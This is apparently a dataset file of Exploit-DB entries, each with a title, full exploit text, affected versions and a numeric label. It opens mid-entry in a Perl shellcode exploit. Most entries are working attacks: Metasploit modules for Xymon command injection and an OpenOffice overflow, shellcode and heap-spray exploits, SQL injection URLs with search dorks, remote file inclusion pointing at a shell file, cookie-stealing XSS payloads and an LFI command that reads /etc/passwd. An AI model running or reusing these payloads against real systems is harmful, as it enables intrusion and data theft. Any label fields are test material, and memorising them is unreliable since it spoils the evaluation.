""\xc8\x21\x1c\xc8\x29\x1c\xc8\x55\x1c\xc8\x51\x1c\xc8\x5d\x52\xd0"". 		  ""\x4d\x94\x94\x95\x95\x1c\xc8\x49\x1c\xc8\x75\x1e\xc8\x31\x1c\xc8"". 		  ""\x71\x1c\xc8\x7d\x1c\xc8\x79\xa6\x4e\x18\xd8\x65\xc4\x18\xd8\x39"". 		  ""\xc4\xc6\xc6\xc6\xff\x94\xc6\xc6\xf3\x52\xd0\x69\xf6\xf8\xf3\x52"". 		  ""\xd0\x6b\xf1\x95\x1d\xc8\x6a\x18\xc0\x69\xc7\xc6\x6a\x45\xa6\x4e"". 		  ""\xfd\xed\xfc\xe1\xc5\xff\x94\xff\xde\xc6\x7d\xf3\x6b\x6a\x6a\x6a"". 		  ""\x45\x95""; my $tip		= inet_aton($ARGV[1]); my $paddr	= sockaddr_in($ARGV[2], $tip);  $paddr=substr($paddr,2,6); $paddr=$paddr^""\x95\x95\x95\x95\x95\x95""; my $rport=substr($paddr,0,2); my $rip=substr($paddr,2,4);  $request	= ""GET /SwEzModule.dll?operation=login&autologin="". 		  ""\x90""x100 .$shellc0deI.$rport.""\x96\x46\x52\x97"".$rip.$shellc0deII. 		  ""\x90""x4103 .$eip.""\x90""x4 .$jmp_back."" HTTP/1.0\r\n\r\n"";  	print $sock $request; 	print ""[+] Sending evil request\t...""; 	close($sock); 	print ""Done\r\n""; exit;    # milw0rm.com [2003-12-18]","['3.5.0', 'v3.3', 'v3.5']",1
47114,"Xymon 4.3.25 - useradm Command Execution (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::CmdStager    def initialize(info = {})     super(update_info(info,       'Name'        => 'Xymon useradm Command Execution',       'Description' => %q{         This module exploits a command injection vulnerability in Xymon         versions before 4.3.25 which allows authenticated users         to execute arbitrary operating system commands as the web         server user.          When adding a new user to the system via the web interface with         `useradm.sh`, the user's username and password are passed to         `htpasswd` in a call to `system()` without validation.          This module has been tested successfully on Xymon version 4.3.10         on Debian 6.       },       'License'     => MSF_LICENSE,       'Author'      => [         'Markus Krell', # Discovery         'bcoles'        # Metasploit       ],       'References'  =>         [           ['CVE', '2016-2056'],           ['PACKETSTORM', '135758'],           ['URL', 'https://lists.xymon.com/pipermail/xymon/2016-February/042986.html'],           ['URL', 'https://www.securityfocus.com/archive/1/537522/100/0/threaded'],           ['URL', 'https://sourceforge.net/p/xymon/code/7892/'],           ['URL', 'https://www.debian.org/security/2016/dsa-3495']         ],       'DisclosureDate' => '2016-02-14',       'Platform'       => %w(unix linux solaris bsd),       'Targets'        =>         [           [             'Unix CMD',             {               'Platform' => 'unix',               'Arch' => ARCH_CMD,               'Payload' => {                 'Space' => 2048,                 'BadChars' => ""\x00\x0A\x0D"",                 'DisableNops' => true,                 'Compat' =>                 {                   'PayloadType' => 'cmd',                   'RequiredCmd' => 'generic perl python netcat php'                 }               }             }           ],           [             'Linux',             {               'Platform' => 'linux',               'Arch'     => [ARCH_X86,ARCH_X64],             }           ],           [             'Solaris',             {               'Platform' => 'solaris',               'Arch' => [ARCH_X86]             }           ],           [             'BSD',             {               'Platform' => 'bsd',               'Arch' => [ARCH_X86, ARCH_X64]             }           ]         ],       'Privileged'     => false,       'DefaultTarget'  => 0))     register_options([       OptString.new('TARGETURI', [         true, 'The base path to Xymon secure CGI directory', '/xymon-seccgi/'       ]),       OptString.new('USERNAME', [true, 'The username for Xymon']),       OptString.new('PASSWORD', [true, 'The password for Xymon'])     ])   end    def user     datastore['USERNAME']   end    def pass     datastore['PASSWORD']   end    def check     res = send_request_cgi({       'uri' => normalize_uri(target_uri.path, 'useradm.sh'),       'authorization' => basic_auth(user, pass)     })      unless res       vprint_status ""#{peer} - Connection failed""       return CheckCode::Unknown     end      if res.code == 401       vprint_status ""#{peer} - Authentication failed""       return CheckCode::Unknown     end      if res.code == 404       vprint_status ""#{peer} - useradm.sh not found""       return CheckCode::Safe     end      unless res.body.include?('Xymon')       vprint_status ""#{peer} - Target is not a Xymon server.""       return CheckCode::Safe     end      version = res.body.scan(/>Xymon ([\d\.]+)</).flatten.first      unless version       vprint_status ""#{peer} - Could not determine Xymon version""       return CheckCode::Detected     end      vprint_status ""#{peer} - Xymon version #{version}""      if Gem::Version.new(version) >= Gem::Version.new('4.3.25')       return CheckCode::Safe     end      CheckCode::Appears   end    def execute_command(cmd, opts = {})     res = send_request_cgi({       'uri' => normalize_uri(target_uri.path, 'useradm.sh'),       'method' => 'POST',       'authorization' => basic_auth(user, pass),       'vars_post' => Hash[{         'USERNAME'   => ""';#{cmd} & echo '"",         'PASSWORD'   => '',         'SendCreate' => 'Create'       }.to_a.shuffle]     }, 5)      return if session_created?      unless res       fail_with(Failure::Unreachable, 'Connection failed')     end      if res.code == 401       fail_with(Failure::NoAccess, 'Authentication failed')     end      unless res.code == 500       fail_with(Failure::Unknown, 'Unexpected reply')     end      print_good ""#{peer} - Payload sent successfully""      res   end    def exploit     unless [Exploit::CheckCode::Detected, Exploit::CheckCode::Appears].include?(check)       fail_with Failure::NotVulnerable, 'Target is not vulnerable'     end      if payload.arch.first == 'cmd'       execute_command(payload.encoded)     else       execute_cmdstager(linemax: 1_500)     end   end end","['4.3.25', 'before 4.3.25']",1
47542,"AUO SunVeillance Monitoring System 1.1.9e - 'MailAdd' SQL Injection # Exploit Title: AUO SunVeillance Monitoring System 1.1.9e - 'MailAdd' SQL Injection # Date: 2019-10-24 # Exploit Author: Luca.Chiou # Vendor Homepage: https://www.auo.com/zh-TW # Version: AUO SunVeillance Monitoring System all versions prior to v1.1.9e # Tested on: It is a proprietary devices: https://solar.auo.com/en-global/Support_Download_Center/index # CVE: N/A  # 1. Description: # AUO SunVeillance Monitoring System all versions prior to v1.1.9e that is vulnerable to SQL Injection. # The vulnerability can allow the attacker inject maliciously SQL command to the server which allows  # the attacker to read privileged data.  # 2. Proof of Concept:  (1) Access the sending mail page of AUO SunVeillance Monitoring System  (/Solar_Web_Portal/mvc_send_mail.aspx) without any authentication.      There is a parameter, MailAdd, in mvc_send_mail.aspx. (2) Modify the value of parameter MailAdd with single quotation. The error messages contains oracle database information. (3) By using sqlmap tools, attacker can acquire the database list which in server side.  cmd: sqlmap.py -u “https://<host>/Solar_Web_Portal/mvc_send_mail.aspx?MailAdd=” -p MailAdd –dbs  (4) Furthermore, there are a few SQL Injection vulnerabilities in other fields.  picture_manage_mvc.aspx (parameter: plant_no) swapdl_mvc.aspx (parameter: plant_no) account_management.aspx (parameter: Text_Postal_Code, Text_Dis_Code)  Thank you for your kind assistance.  Luca","['1.1.9e', 'prior to v1.1.9e']",1
3750,xoops module tsdisplay4xoops 0.1 - Remote File Inclusion # tsdisplay4xoops 0.1(xoops_url)Remote File Include Vulnerabilitiy # D.Script: http://kisskool30.free.fr/tsdisplay4xoopsv0.08.zip  # Discovered by: GolD_M = [Mahmood_ali] # Homepage: http://Www.Tryag.Com/cc # Exploit:[Path]/modules/tsdisplay4xoops/blocks/tsdisplay4xoops_block2.php?xoops_url=Shell # Greetz To: Tryag.Com/cc & Dwrat.Com & Asb-May.Net/bb  # milw0rm.com [2007-04-16],['0.1'],1
31308,"Google Android Web Browser - '.BMP' File Integer Overflow source: https://www.securityfocus.com/bid/28006/info  Android Web Browser is prone to an integer-overflow vulnerability because it fails to adequately handle user-supplied data.  Attackers can exploit this issue to execute arbitrary code in the context of the application. Failed exploit attempts will likely cause denial-of-service conditions.  This issue affects Android SDK m5-rc14 and earlier.   # This script generates a Bitmap file that makes the Android browser jump to the address at 0xffffff+0x10 # Must be loaded inside a HTML file with a tag like this: <IMG src=badbmp.bmp> # Alfredo Ortega - Core Security import struct  offset = 0xffef0000 width = 0x0bffff height=8  bmp =""\x42\x4d\xff\x00\x00\x00\x00\x00\x00\x00"" bmp+=struct.pack(""<I"",offset) bmp+=""\x28\x00\x00\x00"" bmp+=struct.pack(""<I"",width) bmp+=struct.pack(""<I"",height) bmp+=""\x03\x00\x08\x00\x00\x00"" bmp+=""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" bmp+=""\x00\x00\x00\x00\x00\x00\x00\x55\x02\xff\x00\x02\x00\x02\x02\xff"" bmp+=""\xff\x11\xff\x33\xff\x55\xff\x66\xff\x77\xff\x88\x41\x41\x41\x41"" bmp+=""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" bmp+=""\x41\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"" bmp+=""\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"" open(""badbmp.bmp"",""wb"").write(bmp)  The complete exploit page follows:   <HTML> <HEAD> </HEAD> <BODY> <script type=""text/javascript""> // Fill 0x200000 - 0xa00000 with Breakpoints var nop = unescape(""%u0001%uef9f""); while (nop.length <= 0x100000/2) nop += nop; var i = 0; for (i = 0;i<5;i++)   document.write(nop)  // Fill 0xa00000 - 0x1100000 with address 0x00400040 var nop = unescape(""%u4000%u4000""); while (nop.length <= 0x100000/2) nop += nop; var i = 0; for (i = 0;i<2;i++)   document.write(nop) </script> <IMG src=badbmp.bmp> </BODY> </HTML>",['m5-rc14'],1
30980,AwesomeTemplateEngine 1 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/27125/info  AwesomeTemplateEngine is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  AwesomeTemplateEngine 1 is vulnerable; other versions may also be affected.   http://www.example.com/templates/example_template.php?data[title]=%3C/title%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E http://www.example.com/templates/example_template.php?data[message]=%3Cscript%3Ealert(document.cookie)%3C/script%3E http://www.example.com/templates/example_template.php?data[table][1][item]=%3Cscript%3Ealert(document.cookie)%3C/script%3E http://www.example.com/templates/example_template.php?data[table][1][url]=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E http://www.example.com/templates/example_template.php?data[poweredby]=%3Cscript%3Ealert(document.cookie)%3C/script%3E,['1'],1
28330,"Western Digital Arkeia Appliance 10.0.10 - Multiple Vulnerabilities ################################################################################################################################### # Exploit Title: Western Digital Arkeia Appliance v10.0.10 # Date: Sep 17 2013 # Exploit Author: xistence < xistence[at]0x90[.]nl > # Vendor Homepage: www.arkeia.com # Tested on: Virtual Appliance - ESXi 5.1 # Affected Version : v10.0.10 and lower # Link: ftp://ftp.arkeia.com/arkeia-virtual-appliance/vmware-virtual-appliance/full-virtual-appliance/arkeia_virtual_appliance-10.0.10.zip # Fix: Upgrade to version 10.1.10 # ###################################################################################################################################  Arkeia Appliance v10.0.10 is prone to 2 security vulnerabilties:   1) Unauthenticated firmware upload   There are no restrictions when a POST request is send to http://<IP>/scripts/upload.php thus allowing any  unauthenticated client to upload any data to the /tmp/ApplianceUpdate file.   2) Local File Inclusion (LFI) vulnerability in the cookie ""lang=""   By sending a request (without the need for authentication) to the homepage of the appliance with a cookie ""lang=../../../../../../../../../../../../../../../../etc/passwd%00"",  it's possible to read files on the server, in this example /etc/passwd.   Proof of Concept  Run the following command:  curl --cookie ""lang=../../../../../../../../../../../../../../../../etc/passwd%00"" http://<IP>/   Which will return the /etc/passwd:   root:x:0:0:root:/root:/bin/bash  bin:x:1:1:bin:/bin:/sbin/nologin  daemon:x:2:2:daemon:/sbin:/sbin/nologin  adm:x:3:4:adm:/var/adm:/sbin/nologin  lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin  sync:x:5:0:sync:/sbin:/bin/sync  shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown  halt:x:7:0:halt:/sbin:/sbin/halt  mail:x:8:12:mail:/var/spool/mail:/sbin/nologin  uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin  operator:x:11:0:operator:/root:/sbin/nologin  [..snip..]","['10.0.10', 'v10.0.10']",0
35531,"Mediacoder 0.8.33 build 5680 - '.lst' Buffer Overflow (PoC) (SEH Overwrite) # Exploit Title: Mediacoder 0.8.33 build 5680 SEH Buffer Overflow Exploit Dos (.lst) # Date: 11/29/2010 # Author: Hadji Samir s-dz@hotmail.fr # Software Link: http://dl.mediacoderhq.com/files001/MediaCoder-0.8.33.5680.exe # Version: 0.8.33 build 5680  #    EAX 0012E788 #    ECX 43434343 #    EDX 00000000 #    EBX 43434343 #    ESP 0012E724 #    EBP 0012E774 #    ESI 0012E788 #    EDI 00000000  #!/usr/bin/python  buffer = (""http://"" + ""A"" * 845) nseh = (""B"" * 4) seh  = (""C"" * 4) junk = (""D"" * 60)  f= open(""exploit.lst"",'w') f.write(buffer + nseh + seh + junk) f.close()",['0.8.33 build 5680'],1
19607,"Microsoft Windows 95/98 - UNC Buffer Overflow (1) // source: https://www.securityfocus.com/bid/779/info  There is a overflowable buffer in the networking code for Windows 95 and 98 (all versions). The buffer is in the part of the code that handles filenames. By specifying an exceptionally long filename, an attacker can cause the machine to crash or execute arbitrary code. This vulnerability could be exploited remotely by including a hostile UNC or file:// URL in a web page or HTML email. The attack would occur when the page was loaded in a browser or the email was opened (including opening the email in a preview pane.)   /*=============================================================================    Microsoft IE4 for Windows98 exploit    The Shadow Penguin Security (http://shadowpenguin.backsection.net)    Written by UNYUN (shadowpenguin@backsection.net)   ============================================================================= */  #include    <stdio.h> #include    <windows.h>  #define     MAXBUF          1000 #define     RETADR          53   unsigned int mems[]={ 0xbfe30000,0xbfe43000,0xbfe80000,0xbfe86000, 0xbfe90000,0xbfe96000,0xbfea0000,0xbfeb0000, 0xbfee0000,0xbfee5000,0xbff20000,0xbff47000, 0xbff50000,0xbff61000,0xbff70000,0xbffc6000, 0xbffc9000,0xbffe3000,0,0};  unsigned char   exploit_code[200]={ 0x33,0xC0,0x40,0x40,0x40,0x40,0x40,0x50, 0x50,0x90,0xB8,0x2D,0x23,0xF5,0xBF,0x48, 0xFF,0xD0,0x00, };  unsigned int search_mem(FILE *fp,unsigned char *st,unsigned char *ed,                 unsigned char c1,unsigned char c2) {     unsigned char   *p;     unsigned int    adr;      for (p=st;p<ed;p++)         if (*p==c1 && *(p+1)==c2){             adr=(unsigned int)p;             if ((adr&0xff)==0) continue;             if (((adr>>8)&0xff)==0) continue;             if (((adr>>16)&0xff)==0) continue;             if (((adr>>24)&0xff)==0) continue;             return(adr);         }     return(0);  }   main(int argc,char *argv[]) {     FILE                    *fp;     unsigned int            i,ip;     unsigned char           buf[MAXBUF];      if (argc<2){         printf(""usage %s output_htmlfile\n"",argv[0]);         exit(1);     }     if ((fp=fopen(argv[1],""wb""))==NULL) return FALSE;        fprintf(fp,""<META HTTP-EQUIV=\""Refresh\"" CONTENT=\""0;URL=file://test/"");     for (i=0;;i+=2){         if (mems[i]==0){             printf(""Can not find jmp code.\n"");             exit(1);         }         if ((ip=search_mem(fp,(unsigned char *)mems[i],             (unsigned char *)mems[i+1],0xff,0xe4))!=0) break;     }     printf(""Jumping address : %x\n"",ip);     memset(buf,0x41,MAXBUF);          buf[RETADR-1]=0x90;     buf[RETADR  ]=ip&0xff;     buf[RETADR+1]=(ip>>8)&0xff;     buf[RETADR+2]=(ip>>16)&0xff;     buf[RETADR+3]=(ip>>24)&0xff;      memcpy(buf+80,exploit_code,strlen(exploit_code));     buf[MAXBUF]=0;     fprintf(fp,""%s/\"">\n<HTML><B>"",buf);     fprintf(fp,""10 seconds later, this machine will be shut down.</B><BR><BR>"");     fprintf(fp,""If you are using IE4 for Japanese Windows98, "");     fprintf(fp,""maybe, the exploit code which shuts down your machine will be executed.<BR>"");     fprintf(fp,""</HTML>\n"");     fclose(fp);     printf(""%s created.\n"",argv[1]);     return FALSE; }","['95/98', '95', '98']",0
32339,"Microsoft Organization Chart 2 - Remote Code Execution source: https://www.securityfocus.com/bid/31059/info  Microsoft Organization Chart is prone to a remote code-execution vulnerability because of a memory-access violation.  Remote attackers can exploit this issue by enticing victims into opening a maliciously crafted Organization Chart document.  Successful exploits may allow attackers to execute arbitrary code within the context of the affected application. Failed exploit attempts will likely result in a denial of service.  Microsoft Organization Chart 2.00,19 is vulnerable; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32339.rar","['2', '2.0019']",1
5855,"Easy Webstore 1.2 - SQL Injection ######################################################################### #################### Viva IslaM Viva IslaM ############################## ## ## Remote SQL Injection Vulnerability ## ## Easy Webstore v1.2  ( index.php cat_path ) ## ######################################################################### ######################################################################### ## ## AuTh0r : Mr.SQL ## ## H0ME   : WwW.PaL-HaCkEr.CoM  &  WwW.ATsDp.CoM ## ## Email  : SQL@Hotmail.it ## ## !! SYRIAN HaCkErS  !! ######################## ######################## ## ## Script  : Easy Webstore v1.2 ## ## site    : www.webstorexpert.com ## ######################## ######################## ## ## d0rk :  allinurl: ""index.php?cat_path"" ## ## ##     -(:: SQL ::)- ## ##    www.site.com/ ##          index.php?cat_path=-1+union+select+concat(user(),0x2F2A2A2F,version(),0x2F2A2A2F,database())/* ## ##  -(:: L!VE DEMO ::)- ## ##    http://www.webstorexpert.com/demo/index.php?cat_path=-1+union+select+concat(user(),0x2F2A2A2F,version(),0x2F2A2A2F,database())/* ## ####################### #######################  -(:: NOTE ::)- << Cant see no thing in the page :)) open the image and get the info in the link ;) >>   ####################################################################################################### #######################################################################################################                                     -(:: !Gr3E3E3E3E3E3E3TzZ! ::)-    :: HaCkEr-EGy :: His0k4 :: Dark MaSTer :: MoHaMeD el 3rab :: ALwHeD :: HeBarieH :: MusliMs HaCkErs :: ####################################################################################################### #######################################################################################################  # milw0rm.com [2008-06-18]",['1.2'],1
24575,"PSNews 1.1 - 'No' Cross-Site Scripting source: https://www.securityfocus.com/bid/11124/info  PSNews is a Web application that is implemented in PHP.  PSNews is affected by a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied URI input.  This vulnerability is reported to exist in version 1.1 of PSNews.  http://www.example.com/index.php?function=show_all&no=%253cscript>alert%2528document.cookie);%253c/script> http://www.example.com/index.php?function=add_kom&no="">%20<font%20size=""20""%20color=red>%20<b>%20WackY%20%20</font>",['1.1'],1
27551,"Blank'N'Berg 0.2 - Cross-Site Scripting source: https://www.securityfocus.com/bid/17346/info  Blank'N'Berg is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Blank'N'Berg 0.2 is reportedly vulnerable.  http://www.example.com/index.php?_path=""><script>alert(document.cookie)</script>",['0.2'],1
31298,Packeteer PacketShaper and PolicyCenter 8.2.2 - 'FILELIST' Cross-Site Scripting source: https://www.securityfocus.com/bid/27982/info  Packeteer PacketShaper and PolicyCenter are prone to a cross-site scripting vulnerability because they fail to sufficiently sanitize user-supplied input data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   https://www.example.com/whatever.htm?FILELIST=%3C/script%3E%3Cbody+onLoad=alert(%26quot%3BXSS%26quot%3B)%3E%3Cscript%3E,['8.2.2'],1
5546,"BackLinkSpider 1.1 - 'cat_id' SQL Injection ____________________   ___ ___ ________ \_   _____/\_   ___ \ /   |   \\_____  \    |    __)_ /    \  \//    ~    \/   |   \   |        \\     \___\    Y    /    |    \ /_______  / \______  /\___|_  /\_______  /         \/         \/       \/         \/                                           .OR.ID ECHO_ADV_95$2008  ----------------------------------------------------------------------------------------- [ECHO_ADV_95$2008] BackLinkSpider (cat_id) Blind Sql Injection Vulnerability -----------------------------------------------------------------------------------------  Author         : M.Hasran Addahroni Date           : May, 5 th 2008 Location       : Jakarta, Indonesia Web            : http://advisories.echo.or.id/adv/adv95-K-159-2008.txt Critical Lvl   : Medium Impact	       : System access Where	       : From Remote ---------------------------------------------------------------------------  Affected software description: ~~~~~~~~~~~~~~~~~~~~~~~~~~~  Application   : BackLinkSpider version       : unknown Vendor        : http://www.backlinkspider.com/ Description   :  BackLinkSpider is a free link exchange service designed to provide you with access to a growing number of link exchange partners in our link directory page ---------------------------------------------------------------------------  Vulnerability: ~~~~~~~~~~~~~  Input passed to the ""cat_id"" parameter in backlinkspider's page is not properly verified before being used to sql query.  This can be exploited to execute sql query through the browser. Successful exploitation requires that ""magic_quotes"" is enabled.   Poc/Exploit:  ~~~~~~~~~ http://www.target.com/[backlinkspider_page_name].php?cat_id=[SQL] http://www.target.com/[backlinkspider_page_name].php?cat_id=-1%20union%20select%201,2,3,4,5,6,7,8,9,0,1,version(),3,4,5,6,7,8,9,0/*   Dork: ~~~~ Google    : ""Powered By BackLinkSpider"" ""inurl:backlinkspider.php""   Solution: ~~~~~~  - Edit the source code to ensure that input is properly verified. - Turn on magic_quotes in php.ini    Timeline: ~~~~~~~~  - 03 - 05 - 2008 bug found - 05 - 05 - 2008 advisory released ---------------------------------------------------------------------------  Shoutz: ~~~~ ~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath ~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke ~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES ~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b ~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c ~ newbie_hacker@yahoogroups.com ~ #aikmel #e-c-h-o @irc.dal.net ~ special for rgod - good bye mate, thanks for the great works. --------------------------------------------------------------------------- Contact: ~~~~~       K-159 || echo|staff || eufrato[at]gmail[dot]com      Homepage: http://k-159.echo.or.id/  -------------------------------- [ EOF ] ----------------------------------  # milw0rm.com [2008-05-05]",['1.1'],1
30301,Dating Gold 3.0.5 - 'header.php?int_path' Remote File Inclusion source: https://www.securityfocus.com/bid/24910/info  AzDG Dating Gold is prone to multiple remote file-include vulnerabilities because the application fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute an arbitrary remote file containing malicious script code in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system. Other attacks are also possible.  AzDG Dating Gold 3.0.5 is vulnerable; other versions may also be affected.   http://www.example.com/scriptpath/templates/header.php?int_path=http://www.example2.com/shell.txt?cmd,['3.0.5'],1
43462,"Vanilla < 2.1.5 - Cross-Site Request Forgery # Exploit Title: CSRF vulnerabilities in Vanilla Forums below 2.1.5-CVE-2017-1000432 # Google Dork: NA # Date: 7/1/2018 # Contact: https://twitter.com/anandm47 #   website: https://anandtechzone.blogspot.in <https://t.co/MJ8SoRaIMn> # Exploit Author: Anand Meyyappan # Vendor Homepage: https://open.vanillaforums.com <https://open.vanillaforums.com/discussion/28337/vanilla-2-1-5-released-and-2-0-18-14> # Software Link: https://open.vanillaforums.com/addon/vanilla-core-2.1 # Tested on: Windows, Linux # CVE : CVE-2017-1000432  Description   Any registered user can delete topics and comments in forum without having admin access.    2.Proof Of Concept    Save the below code in html format, Once victim is logged into account. Use the below code.  <form method=""post"" action=""https://www.site.com/forum/vanilla/discussion/dismissannouncement?discussionid=3709"">  <input name="" DeliveryType"" value=""VIEW"" class=""input"" type=""hidden"">  <input name="" DeliveryMethod"" value=""JSON"" class=""input"" type=""hidden""> <li> <label><br></label><input value=""Send"" class=""submit"" type=""submit""></li> </ul>  </form>  3. Solution:   Update to version 2.5  https://open.vanillaforums.com/get/vanilla-core-2.5    #Reference  https://open.vanillaforums.com/discussion/28337/vanilla-2-1-5-released-and-2-0-18-14 https://www.cvedetails.com/cve/CVE-2017-1000432/ http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000432",['< 2.1.5'],1
35818,"Nagios 3.2.3 - 'expand' Cross-Site Scripting source: https://www.securityfocus.com/bid/48087/info  Nagios is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Nagios 3.2.3 is vulnerable; other versions may also be affected.   http://www.example.com/nagios/cgi-bin/config.cgi?type=command&expand=<script>alert(String.fromCharCode(88,83,83))</script> http://www.example.com/nagios/cgi-bin/config.cgi?type=command&expand=<body onload=alert(666)>",['3.2.3'],1
18923,"OpenOffice - OLE Importer DocumentSummaryInformation Stream Handling Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::FILEFORMAT  	def initialize(info={}) 		super(update_info(info, 			'Name'           => ""OpenOffice OLE Importer DocumentSummaryInformation Stream Handling Overflow"", 			'Description'    => %q{ 					This module exploits a vulnerability in OpenOffice 2.3.1 and 2.3.0 on 				Microsoft Windows XP SP3.  				By supplying a OLE file with a malformed DocumentSummaryInformation stream, an 				attacker can gain control of the execution flow, which results arbitrary code 				execution under the context of the user. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Marsu <Marsupilamipowa[at]hotmail.fr>', # Vulnerability discovery and PoC 					'juan vazquez'  # Metasploit module 				], 			'References'     => 				[ 					['CVE', '2008-0320'], 					['OSVDB', '44472'], 					['BID', '28819'], 					['EDB', '5584'], 					['URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=694'] 				], 			'Payload'        => 				{ 					'Space' => 407 				}, 			'DefaultOptions'  => 				{ 					'EXITFUNC'          => 'process', 					'DisablePayloadHandler' => 'true' 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 						'OpenOffice 2.3.1 / 2.3.0 on Windows XP SP3', 						{ 							'Ret' => 0x609345fe, # add esp, ebx # ... # ret from tl680mi 							'EBX' => 0xffffefa8, # EBX value 							'JmpEsp' => 0x60915cbd, # push esp # ret from tl680mi 						} 					], 				], 			'Privileged'     => false, 			'DisclosureDate' => ""Apr 17 2008"", 			'DefaultTarget'  => 0))  			register_options( 				[ 					OptString.new('FILENAME', [true, 'The filename', 'msf.doc']) 				], self.class) 	end  	def exploit  		path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2008-0320.doc') 		f = File.open(path, 'rb') 		template = f.read 		f.close  		my_payload = payload.encoded 		template[115717, 4] = [target['Ret']].pack(""V"") 		template[115725, 4] = [target['EBX']].pack(""V"") 		template[115729, 4] = [target['JmpEsp']].pack(""V"") 		template[115808, my_payload.length] = my_payload 		file_create(template)  	end  end","['2.3.1', '2.3.0']",1
18931,"Apple iOS 5.1.1 Safari Browser - 'JS match()' / 'search()' Crash (PoC) #!/usr/bin/env ruby  # - Title # iOS <= v5.1.1 Safari Browser JS match(), search() Crash PoC  # - Author # Alberto Ortega @a0rtega # alberto[@]pentbox[.]net  # - Summary # A vulnerability has been discovered in Apple Safari Browser # included in the last version of iOS (5.1.1). # # Previous versions may be affected too. # # When JavaScript function match() gets a big buffer as # parameter the browser unexpectedly crashes. # # By extension, the function search() is affected too. # # Tested on iOS 5.0.1, 5.1.0, 5.1.1 # Tested on iPod Touch, iPhone and iPad iOS devices.  require ""socket"" require ""optparse""  # Buffer values chr = ""A"" # The size of buffer needed may vary depending # on the device and the iOS version. buffer_len = 925000  # Magic packet body = ""\ <html>\n\ <head><title>Crash PoC</title></head>\n\ <script type=\""text/javascript\"">\n\ var s = \""poc\"";\n\ s.match(\""#{chr*buffer_len}\"");\n\ </script>\n\ </html>"";  def help() 	puts ""iOS <= v5.1.1 Safari Browser JS match(), search() Crash PoC"" 	puts ""#{$0} -p bind_port [-h bind_address] [--verbose]"" end  # Parsing options opts = {} optparser = OptionParser.new do |op| 	op.on(""-h"", ""--host HOST"") do |p| 		opts[""host""] = p 	end 	op.on(""-p"", ""--port PORT"") do |p| 		opts[""port""] = p 	end 	op.on(""-v"", ""--verbose"") do |p| 		opts[""verbose""] = true 	end end  begin 	optparser.parse! rescue 	help() 	exit 1 end  if (opts.length == 0 || opts[""port""] == nil) 	help() 	exit 1 end  if (opts[""verbose""] != nil) 	debug = true else 	debug = false end if (opts[""host""] != nil) 	host = opts[""host""] else 	host = ""0.0.0.0"" end port = opts[""port""]  # Building server if debug 	puts ""Buffer -> #{chr}*#{buffer_len}"" end  begin 	serv = TCPServer.new(host, port) 	puts ""Listening on #{host}:#{port.to_s} ..."" rescue 	puts ""Error listening on #{host}:#{port.to_s}"" 	exit 1 end  begin 	s = serv.accept() 	if debug 		puts ""Client connected, waiting petition ..."" 	end 	data = s.recv(1000) 	if debug 		puts ""Sending crafted packet ..."" 	end 	s.print(body) 	if debug 		puts ""Closing connection ..."" 	end 	s.close() 	puts ""Done!"" rescue 	puts ""Error sending data"" 	exit 1 end","['5.1.1', 'v5.1.1', 'iOS (5.1.1)']",0
